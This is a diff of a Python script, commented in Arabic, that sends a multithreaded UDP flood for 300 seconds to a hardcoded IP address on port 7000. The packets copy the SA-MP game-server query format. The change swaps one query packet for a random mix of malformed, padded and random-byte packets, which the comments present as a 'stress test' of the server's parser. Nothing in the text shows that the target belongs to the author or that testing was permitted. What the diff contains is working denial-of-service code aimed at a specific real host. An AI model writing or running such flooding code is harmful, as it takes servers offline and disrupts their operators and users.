@@ -1,41 +1,52 @@
 import socket
 import time
+import random
 import threading
 
-TARGET_IP = "89.46.1.130"  # IP الهدف
-TARGET_PORT = 7000        # المنفذ
-DURATION = 300              # المدة بالثواني
-THREADS_COUNT = 15          # عدد الخيوط (Threads) لزيادة السرعة
+TARGET_IP = "89.46.1.130"
+TARGET_PORT = 7000
+DURATION = 300  # مدة الاختبار بالثواني
+THREADS = 5
 
-def worker(end_time):
+def smart_stress_worker(end_time):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # بناء حزمة SAMP بشكل صحيح
-    payload = b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
+    
+    # أنواع مختلفة من البايتات لاختبار استجابة معالج السيرفر لعمليات التحليل (Parsing)
+    payloads = [
+        # حزمة استعلام معدلة بلغة غير قياسية أو رموز وهمية
+        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'x' * 50,
+        # حزمة بيانات مبعثرة لاختبار الـ Exception Handling في السيرفر
+        b'\x00\xFF\x00\xFF' + b'SAMP' + bytes([random.randint(0, 255) for _ in range(20)]),
+        # استعلام متكرر برمز مختلف
+        b'SAMP' + socket.inet_aton(TARGET_IP) + int(TARGET_PORT).to_bytes(2, 'little') + b'p'
+    ]
     
     count = 0
     while time.time() < end_time:
         try:
+            # اختيار نمط عشوائي من الحزم لاختبار استجابة الـ Parser
+            payload = random.choice(payloads)
             client.sendto(payload, (TARGET_IP, TARGET_PORT))
             count += 1
         except Exception:
             pass
+            
     client.close()
-    print(f"خيط (Thread) انتهى، تم إرسال {count} حزمة.")
 
-def main():
+def run_test():
     end_time = time.time() + DURATION
-    print(f"جاري بدء اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيوط...")
+    print(f"جاري بدء اختبار تحليل الحزم على {TARGET_IP}:{TARGET_PORT}...")
     
     threads = []
-    for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=worker, args=(end_time,))
+    for _ in range(THREADS):
+        t = threading.Thread(target=smart_stress_worker, args=(end_time,))
         threads.append(t)
         t.start()
         
     for t in threads:
         t.join()
         
-تم الانتهاء من الاختبار.
+    print("انتهى الاختبار بنجاح.")
 
 if __name__ == "__main__":
-    main()
+    run_test()
